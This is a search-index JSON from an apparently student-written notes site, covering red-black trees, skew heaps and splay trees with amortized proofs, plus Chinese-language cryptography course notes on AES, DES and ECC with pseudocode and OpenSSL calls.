&\\ge 1+2\\cdot2^{bh(x)-1}\\ &\\ge 1+2\\cdot2^{h(x)/2-1}\\ h(x)/2-1 &\\le\\ln(({\\rm sizeof}(x)-1)/2) \\le\\ln({\\rm sizeof }(x))\\ h(x) &\\le 2\\ln({\\rm sizeof(x)})+1 \\end{aligned} $$ Insert the initial color of the node is red Delete Delete a leaf node: Reset its parent link to NIL Delete a degree 1 node: Replace the node by its single child Delete a degree 2 node: Replace the node by the largest one in the left subtree or the smallest one in the right subtree. the number of rotations in the DELETE operation is \\(O(1)\\) .\u7ea2\u9ed1\u6811\u5728Insert\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc72\uff0c\u5220\u9664\u7684\u8fc7\u7a0b\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc73 How to Replace Accoring to the three situations, the second and third situation can be transfomed into situation 1. Therefore, we only need to care about situation1 -- how to delete a leaf node. Unfortunately, we can't delete leaf node directly, for the existence of external nodes. case1 case2 case3 case4","title":"Red-Black Trees"},{"location":"course/ads/rb/#red-black-trees","text":"","title":"Red-Black Trees"},{"location":"course/ads/rb/#definition","text":"Every node is either red or black The root is black Every leaf(NIL) is black If a node is red, then both its children are black For each node, all simple paths from the node to descendant leaves contain the same number of black nodes","title":"Definition"},{"location":"course/ads/rb/#lemma","text":"A red-black tree with n internal nodes has height at most \\(2\\ln(N+1)\\) Proof $$ \\begin{aligned} {\\rm sizeof}(x) &= 1+2{\\rm sizeof}(child)\\ &\\ge 1+2\\cdot2^{bh(child)}\\ &\\ge 1+2\\cdot2^{bh(x)-1}\\ &\\ge 1+2\\cdot2^{h(x)/2-1}\\ h(x)/2-1 &\\le\\ln(({\\rm sizeof}(x)-1)/2) \\le\\ln({\\rm sizeof }(x))\\ h(x) &\\le 2\\ln({\\rm sizeof(x)})+1 \\end{aligned} $$","title":"Lemma"},{"location":"course/ads/rb/#insert","text":"the initial color of the node is red","title":"Insert"},{"location":"course/ads/rb/#delete","text":"Delete a leaf node: Reset its parent link to NIL Delete a degree 1 node: Replace the node by its single child Delete a degree 2 node: Replace the node by the largest one in the left subtree or the smallest one in the right subtree. the number of rotations in the DELETE operation is \\(O(1)\\) .\u7ea2\u9ed1\u6811\u5728Insert\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc72\uff0c\u5220\u9664\u7684\u8fc7\u7a0b\u4e2d\u65cb\u8f6c\u6b21\u6570\u4e0d\u8d85\u8fc73","title":"Delete"},{"location":"course/ads/rb/#how-to-replace","text":"Accoring to the three situations, the second and third situation can be transfomed into situation 1. Therefore, we only need to care about situation1 -- how to delete a leaf node. Unfortunately, we can't delete leaf node directly, for the existence of external nodes. case1 case2 case3 case4","title":"How to Replace"},{"location":"course/ads/skew/","text":"Skew Heaps a simple version of the C01N-Leftlist Heaps Character Any M consecutive operations take at most \\(O(M\\log{N})\\) time Merge Always swap the left and right children except that the largest of all the nodes on the right paths does not have its children swapped. Analysis heavy node A node p is heavy if the number of descendants of p's right subtree is at least half of the number of descendants of p, and light otherwise. Amortized Analysis Proof \\(T_{\\rm amortized}=O(\\log{N})\\) Let \\(\\Phi(D_i)=\\rm number \\ of\\ heavy\\ node\\) Thus \\[ \\begin{aligned} &\\Phi_i = h_1+h_2+h\\\\ &\\Phi_{i+1} \\le l_1+l_2+h(\\rm all \\ the\\ h_i\\ will\\ change\\ into\\ l_i)\\\\ \\end{aligned} \\] \\[ \\begin{aligned} T_{\\rm amoritized} &= T_{\\rm worst}+\\Phi_{i+1}-\\Phi_{i}\\\\ &=(l_1+l_2+h_1+h_2) + \\Phi_{i+1}-\\Phi_{i}\\\\ &\\le 2(l_1+l_2) \\end{aligned} \\] light nodes along the right path: \\(l=O(\\log{N})\\to T_{\\rm amortized}=O(\\log{N})\\)","title":"Skew Heaps"},{"location":"course/ads/skew/#skew-heaps","text":"a simple version of the C01N-Leftlist Heaps","title":"Skew Heaps"},{"location":"course/ads/skew/#character","text":"Any M consecutive operations take at most \\(O(M\\log{N})\\) time","title":"Character"},{"location":"course/ads/skew/#merge","text":"Always swap the left and right children except that the largest of all the nodes on the right paths does not have its children swapped.","title":"Merge"},{"location":"course/ads/skew/#analysis","text":"","title":"Analysis"},{"location":"course/ads/skew/#heavy-node","text":"A node p is heavy if the number of descendants of p's right subtree is at least half of the number of descendants of p, and light otherwise.","title":"heavy node"},{"location":"course/ads/skew/#amortized-analysis","text":"Proof \\(T_{\\rm amortized}=O(\\log{N})\\) Let \\(\\Phi(D_i)=\\rm number \\ of\\ heavy\\ node\\) Thus \\[ \\begin{aligned} &\\Phi_i = h_1+h_2+h\\\\ &\\Phi_{i+1} \\le l_1+l_2+h(\\rm all \\ the\\ h_i\\ will\\ change\\ into\\ l_i)\\\\ \\end{aligned} \\] \\[ \\begin{aligned} T_{\\rm amoritized} &= T_{\\rm worst}+\\Phi_{i+1}-\\Phi_{i}\\\\ &=(l_1+l_2+h_1+h_2) + \\Phi_{i+1}-\\Phi_{i}\\\\ &\\le 2(l_1+l_2) \\end{aligned} \\] light nodes along the right path: \\(l=O(\\log{N})\\to T_{\\rm amortized}=O(\\log{N})\\)","title":"Amortized Analysis"},{"location":"course/ads/splay/","text":"Splay Trees Definition Any \\(M\\) consecutive tree operations starting from an empty tree take at most \\(O(M\\log N)\\) time. Rotation zig-zag zig-zig Analysis Let \\(\\Phi(T)=\\sum\\limits_{i\\in T}\\log{Size(i)}\\) According to \\(\\hat{c_i} = c_i + \\Phi(T) - \\Phi(T_{{\\rm before}})\\) Moreover, we can proof that \\[ \\begin{aligned} Zig&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=1+R_2(X)-R_1(X)+R_2(P)-R_1(P)\\le 1+R_2(X)-R_1(X)\\\\ Zig-Zag&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ Zig-Zig&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ \\end{aligned} \\] Thus, the amortized time to splay a tree with root \\(T\\) at node \\(X\\) is at most \\(3(R(T)-R(X))+1=O(\\log{N})\\)","title":"Splay Trees"},{"location":"course/ads/splay/#splay-trees","text":"","title":"Splay Trees"},{"location":"course/ads/splay/#definition","text":"Any \\(M\\) consecutive tree operations starting from an empty tree take at most \\(O(M\\log N)\\) time.","title":"Definition"},{"location":"course/ads/splay/#rotation","text":"zig-zag zig-zig","title":"Rotation"},{"location":"course/ads/splay/#analysis","text":"Let \\(\\Phi(T)=\\sum\\limits_{i\\in T}\\log{Size(i)}\\) According to \\(\\hat{c_i} = c_i + \\Phi(T) - \\Phi(T_{{\\rm before}})\\) Moreover, we can proof that \\[ \\begin{aligned} Zig&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=1+R_2(X)-R_1(X)+R_2(P)-R_1(P)\\le 1+R_2(X)-R_1(X)\\\\ Zig-Zag&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ Zig-Zig&: \\hat{c_i}=c_i+\\Phi(T)-\\Phi(T')=2+R_2(X)-R_1(X)+R_2(P)-R_1(P)+R_2(G)-R_1(G)\\le 2(R_2(X)-R_1(X))\\\\ \\end{aligned} \\] Thus, the amortized time to splay a tree with root \\(T\\) at node \\(X\\) is at most \\(3(R(T)-R(X))+1=O(\\log{N})\\)","title":"Analysis"},{"location":"course/crypto/","text":"\u5bc6\u7801\u5b66(2021-2022\u6625\u590f) Introduction \u4e0a\u7684\u662f\u767d\u6d2a\u6b22\u8001\u5e08\u7684\u5bc6\u7801\u5b66\u8bfe\u7a0b\u3002 \u8bfe\u4e0a\u4e3b\u8981\u4ecb\u7ecd\u4e86\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002 \u8bfe\u7a0b\u504f\u5411\u5de5\u7a0b\u5b9e\u8df5\uff0c\u6570\u5b66\u76f8\u5173\u7684\u8bc1\u660e\u8f83\u5c11\u3002 \u7b14\u8bb0\u4ec5\u4f9b\u53c2\u8003\uff0c\u5982\u679c\u6709\u7eb0\u6f0f\uff0c\u6b22\u8fce\u90ae\u4ef6\u8054\u7cfb\u3002 References \u5f80\u5e74\u7684\u8003\u5bdf\u77e5\u8bc6\u70b9 \u4e00\u4f4d\u5b66\u957fNotion\u7b14\u8bb0","title":"\u5bc6\u7801\u5b66(2021-2022\u6625\u590f)"},{"location":"course/crypto/#2021-2022","text":"","title":"\u5bc6\u7801\u5b66(2021-2022\u6625\u590f)"},{"location":"course/crypto/#introduction","text":"\u4e0a\u7684\u662f\u767d\u6d2a\u6b22\u8001\u5e08\u7684\u5bc6\u7801\u5b66\u8bfe\u7a0b\u3002 \u8bfe\u4e0a\u4e3b\u8981\u4ecb\u7ecd\u4e86\u53e4\u5178\u5bc6\u7801\u5b66\uff0c\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u548c\u975e\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5\u3002 \u8bfe\u7a0b\u504f\u5411\u5de5\u7a0b\u5b9e\u8df5\uff0c\u6570\u5b66\u76f8\u5173\u7684\u8bc1\u660e\u8f83\u5c11\u3002 \u7b14\u8bb0\u4ec5\u4f9b\u53c2\u8003\uff0c\u5982\u679c\u6709\u7eb0\u6f0f\uff0c\u6b22\u8fce\u90ae\u4ef6\u8054\u7cfb\u3002","title":"Introduction"},{"location":"course/crypto/#references","text":"\u5f80\u5e74\u7684\u8003\u5bdf\u77e5\u8bc6\u70b9 \u4e00\u4f4d\u5b66\u957fNotion\u7b14\u8bb0","title":"References"},{"location":"course/crypto/AES/","text":"AES Introduction \u6700\u4e3a\u201c\u53ef\u9760\u201d\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 WinRAR\uff0c7-zip\u52a0\u5bc6\u6587\u4ef6\u65f6\u7528\u7684\u5c31\u662fAES \u52d2\u7d22\u8f6f\u4ef6\u7528\u7684\u4e5f\u662fAES\u7b97\u6cd5\u52a0\u5bc6\uff08\u4f7f\u7528RSA\u4f20\u9012\u5bc6\u94a5\uff09 Format \u660e\u6587\u957f\u5ea6=16byte\uff0c\u5bc6\u6587\u957f\u5ea6=16byte AES\u7684key\u6709\u4e09\u79cd\u89c4\u683c\uff0c\u5206\u522b\u4e3a(16byte\uff0c24byte,32byte) Encryption unsigned char a [ 4 ] = { 0x03 , 0x01 , 0x01 , 0x02 }; AddRoundKey ( p , k ); // \u5708\u5bc6\u94a5\u52a0\u6cd5\u8fd0\u7b97 result = p ^ k // (\u5728GF(2^8)\u4e2d\u52a0\u6cd5\u7b49\u4ef7\u4e8e\u5f02\u6216) for ( i = 1 ; i <= 10 ; i ++ ) { ByteSub ( p , 16 ); // sbox\u5b57\u8282\u66ff\u6362 p[i] = sbox[p[i]]; // \u5728ShiftRow\u4e4b\u524d\uff0cp\u8981\u8fdb\u884c\u884c\u5217\u53d8\u6362 ShiftRow ( p ); // \u9010\u884c\u8fdb\u884c\u5faa\u73af\u4f4d\u79fb if ( i != 10 ) // MixColumn\uff0c\u591a\u9879\u5f0f\u4e58\u6cd5 MixColumn ( p , a , 1 ); /* do mul */ else MixColumn ( p , a , 0 ); /* don't mul */ AddRoundKey ( p , k + i * ( 4 * 4 )); } \u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8868\u6362\u4e3b\u8981\u662f\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u7684MixColumn\u8fd0\u7b97(ShfitRow\u672c\u8eab\u8981\u548cMixColumn\u7ed3\u5408) \u5982\u679c\u4e0d\u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8f6c\u6362\uff0c\u5728MixColumn\u4e2d\u8ba1\u7b97\u4f1a\u6bd4\u8f83\u590d\u6742 MixColumn \u591a\u9879\u5f0f\u4e58\u6cd5(\u4e00\u6b21\u52a0\u5bc64byte\uff0c1byte\u8868\u793a\u4e00\u4e2a\u591a\u9879\u5f0f\u7cfb\u6570) \u4f8b\uff1a \\((3x^3+x^2+x+2)*(a_3x^3+a_2x^2+a_1x^1+a_0x^0)\\mod (x^4+1)\\) \u88ab\u4e58\u6570 \\(3x^3+x^2+x+2\\) \u7ed9\u5b9a\uff0c\u5728 \\(x^4+1\\) \u4e0b\u4e0d\u53ef\u7ea6\uff0c\u5176\u4e58\u6cd5\u9006\u5143\u4e3a \\(Bx^3+Dx^2+9x+E\\) \uff08\u82e5 \\(3x^3+x^2+x+2\\) \u4e0d\u53ef\u7ea6\uff0c\u5219 \\(x^4+1\\) (\u53ef\u62c6\u5206\u4e3a \\((x^2+1)^2\\) ), \\(3x^3+x^2+x+2\\) \u53ef\u80fd\u4e0d\u4e92\u7d20\uff09 \u672c\u8eab\u7684\u4e58\u6cd5 \u603b\u6d41\u7a0b \u9ad8\u6b21\u7cfb\u6570\u5728\u4e0b\uff0c\u4f4e\u6b21\u7cfb\u6570\u5728\u4e0a\uff0c\u8fdb\u884c\u77e9\u9635\u4e58\u6cd5 \u5de6\u4e58\u7684\u77e9\u9635\uff0c\u56e0\u4e3a\u539f\u591a\u9879\u5f0f \\((3x^3+x^2+x+2)\\) \u7ed9\u5b9a\uff0c\u6240\u4ee5\u8be5\u77e9\u9635\u4e5f\u56fa\u5b9a\u4e0d\u53d8 \u7cfb\u6570\u7684\u8fd0\u7b97 \u52a0\u6cd5\u4f7f\u7528\u5f02\u6216 \u4e58\u6cd5\u4f7f\u7528\u519c\u592b\u7b97\u6cd5(\u4f7f\u5f97\u7ed3\u679c\u4ecd\u4e3a1byte) \u519c\u592b\u7b97\u6cd5 target: \\(x(8bit)*y(8bit)\\mod 11Bh = z(8bit)\\) int z = 0 ; while ( y ){ // \u7c7b\u4f3c\u5feb\u901f\u5e42 if ( y & 1 ){ z = z ^ x ; } x = x << 1 ; y = y >> 1 ; if ( x & ( 1 << 8 )){ x = x ^ 0x11B // x = x - 11B \u56e0\u4e3a\u5728GF(2^8)\u4e2d\uff0c11B+11B=11B^11B=0 } } Sbox\u751f\u6210 sbox[a] =(( \\(a^{-1}\\) * 0x1F) mod ( \\(X^8\\) + 1)) ^ 0x63; \u8f6e\u5bc6\u94a5\u751f\u6210 \u4ee5\u6700\u521d\u76844byte\u5bc6\u94a5\u4f5c\u4e3a\u79cd\u5b50\u5bc6\u94a5\uff0c\u6bcf\u8f6e\u751f\u62104byte\u65b0\u5bc6\u94a5\uff0c\u5171\u8fdb\u884c10\u8f6e k[4] = k[3] k[4:7]\u5faa\u73af\u5de6\u79fb1byte k[4:7]\u5728sbox\u4e2d\u66ff\u6362 k[4] ^= r (r = \\(2^{(i-4)/4}\\) mod 0x11B) k[4] ^= k[0] k[5] = k[4] ^ k[1]\uff1bk[6] = k[5] ^ k[2]\uff1bk[7] = k[6] ^ k[3]\uff1b Math \\(GF(2)\\) \u52a0\u6cd5\u7b49\u6548\u4e8e\u5f02\u6216 0+1=1,1+0=1,0+0=0,1+1=0 \\(GF(2^8)\\) \u52a0\u6cd5\u6309\u4f4d\u52a0\u6cd5(\u5f02\u6216)\uff0c\u4e0d\u8fdb\u4f4d 00110111+00001111=00111000 \u4efb\u610f\u4e00\u4e2a\u6570\u7684\u76f8\u53cd\u6570\u5c31\u662f\u5b83\u672c\u8eab 00110111+00110111=00000000","title":"AES"},{"location":"course/crypto/AES/#aes","text":"","title":"AES"},{"location":"course/crypto/AES/#introduction","text":"\u6700\u4e3a\u201c\u53ef\u9760\u201d\u7684\u5bf9\u79f0\u52a0\u5bc6\u7b97\u6cd5 WinRAR\uff0c7-zip\u52a0\u5bc6\u6587\u4ef6\u65f6\u7528\u7684\u5c31\u662fAES \u52d2\u7d22\u8f6f\u4ef6\u7528\u7684\u4e5f\u662fAES\u7b97\u6cd5\u52a0\u5bc6\uff08\u4f7f\u7528RSA\u4f20\u9012\u5bc6\u94a5\uff09","title":"Introduction"},{"location":"course/crypto/AES/#format","text":"\u660e\u6587\u957f\u5ea6=16byte\uff0c\u5bc6\u6587\u957f\u5ea6=16byte AES\u7684key\u6709\u4e09\u79cd\u89c4\u683c\uff0c\u5206\u522b\u4e3a(16byte\uff0c24byte,32byte)","title":"Format"},{"location":"course/crypto/AES/#encryption","text":"unsigned char a [ 4 ] = { 0x03 , 0x01 , 0x01 , 0x02 }; AddRoundKey ( p , k ); // \u5708\u5bc6\u94a5\u52a0\u6cd5\u8fd0\u7b97 result = p ^ k // (\u5728GF(2^8)\u4e2d\u52a0\u6cd5\u7b49\u4ef7\u4e8e\u5f02\u6216) for ( i = 1 ; i <= 10 ; i ++ ) { ByteSub ( p , 16 ); // sbox\u5b57\u8282\u66ff\u6362 p[i] = sbox[p[i]]; // \u5728ShiftRow\u4e4b\u524d\uff0cp\u8981\u8fdb\u884c\u884c\u5217\u53d8\u6362 ShiftRow ( p ); // \u9010\u884c\u8fdb\u884c\u5faa\u73af\u4f4d\u79fb if ( i != 10 ) // MixColumn\uff0c\u591a\u9879\u5f0f\u4e58\u6cd5 MixColumn ( p , a , 1 ); /* do mul */ else MixColumn ( p , a , 0 ); /* don't mul */ AddRoundKey ( p , k + i * ( 4 * 4 )); } \u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8868\u6362\u4e3b\u8981\u662f\u4e3a\u4e86\u65b9\u4fbf\u540e\u7eed\u7684MixColumn\u8fd0\u7b97(ShfitRow\u672c\u8eab\u8981\u548cMixColumn\u7ed3\u5408) \u5982\u679c\u4e0d\u5728ShiftRow\u4e4b\u524d\u8fdb\u884c\u884c\u5217\u8f6c\u6362\uff0c\u5728MixColumn\u4e2d\u8ba1\u7b97\u4f1a\u6bd4\u8f83\u590d\u6742","title":"Encryption"},{"location":"course/crypto/AES/#mixcolumn","text":"\u591a\u9879\u5f0f\u4e58\u6cd5(\u4e00\u6b21\u52a0\u5bc64byte\uff0c1byte\u8868\u793a\u4e00\u4e2a\u591a\u9879\u5f0f\u7cfb\u6570) \u4f8b\uff1a \\((3x^3+x^2+x+2)*(a_3x^3+a_2x^2+a_1x^1+a_0x^0)\\mod (x^4+1)\\) \u88ab\u4e58\u6570 \\(3x^3+x^2+x+2\\) \u7ed9\u5b9a\uff0c\u5728 \\(x^4+1\\) \u4e0b\u4e0d\u53ef\u7ea6\uff0c\u5176\u4e58\u6cd5\u9006\u5143\u4e3a \\(Bx^3+Dx^2+9x+E\\) \uff08\u82e5 \\(3x^3+x^2+x+2\\) \u4e0d\u53ef\u7ea6\uff0c\u5219 \\(x^4+1\\) (\u53ef\u62c6\u5206\u4e3a \\((x^2+1)^2\\) ), \\(3x^3+x^2+x+2\\) \u53ef\u80fd\u4e0d\u4e92\u7d20\uff09 \u672c\u8eab\u7684\u4e58\u6cd5 \u603b\u6d41\u7a0b \u9ad8\u6b21\u7cfb\u6570\u5728\u4e0b\uff0c\u4f4e\u6b21\u7cfb\u6570\u5728\u4e0a\uff0c\u8fdb\u884c\u77e9\u9635\u4e58\u6cd5 \u5de6\u4e58\u7684\u77e9\u9635\uff0c\u56e0\u4e3a\u539f\u591a\u9879\u5f0f \\((3x^3+x^2+x+2)\\) \u7ed9\u5b9a\uff0c\u6240\u4ee5\u8be5\u77e9\u9635\u4e5f\u56fa\u5b9a\u4e0d\u53d8 \u7cfb\u6570\u7684\u8fd0\u7b97 \u52a0\u6cd5\u4f7f\u7528\u5f02\u6216 \u4e58\u6cd5\u4f7f\u7528\u519c\u592b\u7b97\u6cd5(\u4f7f\u5f97\u7ed3\u679c\u4ecd\u4e3a1byte)","title":"MixColumn"},{"location":"course/crypto/AES/#_1","text":"target: \\(x(8bit)*y(8bit)\\mod 11Bh = z(8bit)\\) int z = 0 ; while ( y ){ // \u7c7b\u4f3c\u5feb\u901f\u5e42 if ( y & 1 ){ z = z ^ x ; } x = x << 1 ; y = y >> 1 ; if ( x & ( 1 << 8 )){ x = x ^ 0x11B // x = x - 11B \u56e0\u4e3a\u5728GF(2^8)\u4e2d\uff0c11B+11B=11B^11B=0 } }","title":"\u519c\u592b\u7b97\u6cd5"},{"location":"course/crypto/AES/#sbox","text":"sbox[a] =(( \\(a^{-1}\\) * 0x1F) mod ( \\(X^8\\) + 1)) ^ 0x63;","title":"Sbox\u751f\u6210"},{"location":"course/crypto/AES/#_2","text":"\u4ee5\u6700\u521d\u76844byte\u5bc6\u94a5\u4f5c\u4e3a\u79cd\u5b50\u5bc6\u94a5\uff0c\u6bcf\u8f6e\u751f\u62104byte\u65b0\u5bc6\u94a5\uff0c\u5171\u8fdb\u884c10\u8f6e k[4] = k[3] k[4:7]\u5faa\u73af\u5de6\u79fb1byte k[4:7]\u5728sbox\u4e2d\u66ff\u6362 k[4] ^= r (r = \\(2^{(i-4)/4}\\) mod 0x11B) k[4] ^= k[0] k[5] = k[4] ^ k[1]\uff1bk[6] = k[5] ^ k[2]\uff1bk[7] = k[6] ^ k[3]\uff1b","title":"\u8f6e\u5bc6\u94a5\u751f\u6210"},{"location":"course/crypto/AES/#math","text":"","title":"Math"},{"location":"course/crypto/AES/#gf2","text":"\u52a0\u6cd5\u7b49\u6548\u4e8e\u5f02\u6216 0+1=1,1+0=1,0+0=0,1+1=0","title":"\\(GF(2)\\)"},{"location":"course/crypto/AES/#gf28","text":"\u52a0\u6cd5\u6309\u4f4d\u52a0\u6cd5(\u5f02\u6216)\uff0c\u4e0d\u8fdb\u4f4d 00110111+00001111=00111000 \u4efb\u610f\u4e00\u4e2a\u6570\u7684\u76f8\u53cd\u6570\u5c31\u662f\u5b83\u672c\u8eab 00110111+00110111=00000000","title":"\\(GF(2^8)\\)"},{"location":"course/crypto/DES/","text":"DES Info 2022/6/14 DES\u52a0\u5bc6\u8fc7\u7a0b\u8865\u5145\uff08R(48)\u548ckey\u5f02\u6216\uff09 Data Encryption Standard \u5bc6\u94a5\u957f\u5ea6\u4e3a64bit \u660e\u6587\u52a0\u5bc6\u53ef\u91c7\u7528ECB\u3001CBC\u3001CFB \u5927\u81f4\u6d41\u7a0b \u5bc6\u94a5\u5904\u7406 key\u5bc6\u94a5 \u5bc6\u94a5\uff0c64bit \u7ecf\u8fc7\u5904\u7406\u751f\u621016\u4e2a48bit\u7684key\uff0c\u7528\u4e8e16\u8f6e\u52a0\u5bc6\u5faa\u73af key\u521d\u59cb\u5316 \u7528\u6237\u6307\u5b9a\u521d\u59cb\u5bc6\u94a5 key_perm_table : \u4ece8\u5b57\u8282\u7684key\u4e2d\u9009\u62e956bit\uff0c\u5e76\u62c6\u5206\u6210\u5de6\u53f3\u4e24\u534a(28bit+28bit) key\u5faa\u73af\u8fc7\u7a0b key_rol_steps \uff0c\u4e24\u4e2a28bit\u5206\u522b\u5faa\u73af\u5de6\u79fb key_56bit_to_48bit_table : \u4ece56bit\u4e2d\u9009\u51fa48\u4e2abit \u7ee7\u7eed\u6267\u884c\u6b65\u9aa4a DES\u52a0\u5bc6 IP(64bit->64bit) \u7f6e\u6362 \u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316 f(R(32),key(48)) (32bit->32bit) \u7ecf\u8fc7\u4f4d\u9009\u62e9\u51fd\u6570E R(32)->R(48) (32bit->48bit) R(48)\u548ckey(48)\u5f02\u6216 S\u76d2 char S[8][64] 8*(a1a2a3a4a5a6) = 8*S[a1a6][a2a3a4a5] (48bit->32bit) \u7f6e\u6362\u51fd\u6570P(32bit->32bit) FP(64bit->64bit) IP-1\uff0cIP\u7684\u9006\u8fd0\u7b97 \u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316 \u4e09\u91cdDES c = E(D(E(p,k1), k2), k3) p = D(E(D(c,k3), k2), k1)","title":"DES"},{"location":"course/crypto/DES/#des","text":"Info 2022/6/14 DES\u52a0\u5bc6\u8fc7\u7a0b\u8865\u5145\uff08R(48)\u548ckey\u5f02\u6216\uff09 Data Encryption Standard \u5bc6\u94a5\u957f\u5ea6\u4e3a64bit \u660e\u6587\u52a0\u5bc6\u53ef\u91c7\u7528ECB\u3001CBC\u3001CFB","title":"DES"},{"location":"course/crypto/DES/#_1","text":"","title":"\u5927\u81f4\u6d41\u7a0b"},{"location":"course/crypto/DES/#_2","text":"key\u5bc6\u94a5 \u5bc6\u94a5\uff0c64bit \u7ecf\u8fc7\u5904\u7406\u751f\u621016\u4e2a48bit\u7684key\uff0c\u7528\u4e8e16\u8f6e\u52a0\u5bc6\u5faa\u73af key\u521d\u59cb\u5316 \u7528\u6237\u6307\u5b9a\u521d\u59cb\u5bc6\u94a5 key_perm_table : \u4ece8\u5b57\u8282\u7684key\u4e2d\u9009\u62e956bit\uff0c\u5e76\u62c6\u5206\u6210\u5de6\u53f3\u4e24\u534a(28bit+28bit) key\u5faa\u73af\u8fc7\u7a0b key_rol_steps \uff0c\u4e24\u4e2a28bit\u5206\u522b\u5faa\u73af\u5de6\u79fb key_56bit_to_48bit_table : \u4ece56bit\u4e2d\u9009\u51fa48\u4e2abit \u7ee7\u7eed\u6267\u884c\u6b65\u9aa4a","title":"\u5bc6\u94a5\u5904\u7406"},{"location":"course/crypto/DES/#des_1","text":"IP(64bit->64bit) \u7f6e\u6362 \u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316 f(R(32),key(48)) (32bit->32bit) \u7ecf\u8fc7\u4f4d\u9009\u62e9\u51fd\u6570E R(32)->R(48) (32bit->48bit) R(48)\u548ckey(48)\u5f02\u6216 S\u76d2 char S[8][64] 8*(a1a2a3a4a5a6) = 8*S[a1a6][a2a3a4a5] (48bit->32bit) \u7f6e\u6362\u51fd\u6570P(32bit->32bit) FP(64bit->64bit) IP-1\uff0cIP\u7684\u9006\u8fd0\u7b97 \u4f7f\u7528perm\u8fdb\u884c\u67e5\u8868\u4f18\u5316","title":"DES\u52a0\u5bc6"},{"location":"course/crypto/DES/#des_2","text":"c = E(D(E(p,k1), k2), k3) p = D(E(D(c,k3), k2), k1)","title":"\u4e09\u91cdDES"},{"location":"course/crypto/ECC/","text":"ECC \u692d\u5706\u66f2\u7ebf\u53ef\u4ee5\u5b9a\u4e49\u4e3a\u6240\u6709\u6ee1\u8db3\u65b9\u7a0b \\(E: y^2=x^3+ax+b\\) \u7684\u70b9(x,y)\u6240\u6784\u6210\u7684\u96c6\u5408\u3002 ECC\u7b97\u6cd5\u7684\u516d\u8981\u7d20 a\uff0cb\uff1a\u692d\u5706\u66f2\u7ebf\u7cfb\u6570 p\uff1a\u6a21\u6570 \u57fa\u70b9G\uff08\u66f2\u7ebf\u4e0a\u7684\u4e00\u4e2a\u70b9\uff09 G\u7684\u9636n (n * G = O) \u4f59\u56e0\u5b50 = \u66f2\u7ebf\u7684\u9636/G\u7684\u9636 ECC\u7b97\u6cd5\u7684\u6570\u5b66\u57fa\u7840 \u692d\u5706\u66f2\u7ebf\u5728\u7d20\u57df \\(Z_p\\) \u4e0a\u7684\u8fd0\u7b97\u89c4\u5219 P+O=O+P=P; \u82e5P( \\(x_1\\) , \\(y_1\\) ), Q( \\(x_2\\) , \\(y_2\\) )\u6ee1\u8db3 \\(x_1=x_2,y_1+y_2=0\\) \uff0c\u5219P+Q=O; \u82e5P( \\(x_1\\) , \\(y_1\\) ), Q( \\(x_2\\) , \\(y_2\\) )\u4e0d\u6ee1\u8db3\u4e0a\u9762\u7684\u6027\u8d28\uff0c\u5219 \\(x_3 = \\lambda^2-x_1-x_2\\) \\(y_3=\\lambda(x_1-x_3)-y_1\\) \u82e5 \\(P\\ne Q\\) \uff0c \\(\\lambda=(y_2-y_1)/(x_2-x_1)\\) ; \u82e5 \\(P=Q\\) \uff0c \\(\\lambda=(3x_1^2+a)/(2y_1)\\) . \u692d\u5706\u66f2\u7ebf\u7684\u4e58\u6cd5\u6027\u8d28 \u82e5 \\(Q=k*P\\) (k<n)\uff0c\u5176\u4e2dk\u662f\u5e38\u6570\uff0cQ\u3001P\u662f\u66f2\u7ebf\u4e0a\u7684\u70b9\uff0c\u5219\u901a\u8fc7k,P\u8ba1\u7b97Q\u7b80\u5355\uff0c\u4f46\u662f\u901a\u8fc7Q\u3001P\u63a8\u7b97k\u8f83\u4e3a\u590d\u6742\u3002 OpenSSL\u4e2d\u7684ECC\u5e93 \u521b\u5efagroup EC_GROUP *group=EC_GROUP_new(EC_GFp_simple_method()); a,b,p\u521d\u59cb\u5316group EC_GROUP_set_curve_GFp(group,p,a,b,ctx); \u521b\u5efa\u57fa\u70b9G\u5e76\u901a\u8fc7tx,ty\u521d\u59cb\u5316 G=EC_POINT_new(group); EC_POINT_set_affine_coordinates_GFp(group,G,tx,ty,ctx); G,n,\u4f59\u56e0\u5b50(1)\u8bbe\u7f6egroup EC_GROUP_set_generator(group, G, n, BN_value_one()); \u83b7\u5f97\u70b9T\u7684\u5750\u6807(tx,ty) EC_POINT_get_affine_coordinates_GFp(group,T,tx,ty,ctx) ECC\u4e0a\u7684\u52a0\u6cd5 T = T + G EC_POINT_add(group,T,T,G,ctx) ECC\u4e0a\u7684\u4e58\u6cd5 T = m * G EC_POINT_mul(group,T,m,NULL,NULL,ctx) T = m * G + n * P EC_POINT_mul(group,T,m,P,n,ctx) ECC\u52a0\u5bc6\u89e3\u5bc6 \u516c\u94a5(\u516c\u94a5\u70b9) R = d * G \u79c1\u94a5 d (d < n) 